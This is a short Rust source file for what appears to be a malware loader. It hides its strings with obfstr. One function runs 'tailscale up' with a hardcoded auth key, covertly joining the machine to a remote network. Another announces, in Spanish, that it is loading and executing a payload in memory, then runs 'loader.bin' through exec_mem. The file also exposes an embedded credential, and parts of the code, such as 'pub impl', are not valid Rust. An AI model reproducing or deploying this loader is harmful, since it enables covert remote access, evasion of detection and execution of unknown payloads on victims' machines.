use obfstr::obfstr;
use std::process::Command;
use exec_mem::exec_mem;
pub struct Loader 
{
    pub var : String,
}

pub impl Loader 
{
    pub fn connection_test()
    {
        let instru = Command::new(obfstr!("tailscale"))
            .args([
                obfstr!("up"),
                obfstr!("--auth-key"),
                obfstr!("tskey-auth-kWSG3gyHT311CNTRL-C5UjKUjLLb84RM48YpEJc8KLFpR1rYTg"),
            ])
            .status()
            .expect("error");
    }
    pub fn terminator()
    {
        println!(obfstr!("[+] Cargando y ejecutando payload en memoria..."));
        match exec_mem("loader.bin") 
        {
            Ok(_) => println!("done"),
            Err(e) => eprintln!("Error"),
        }

    }
}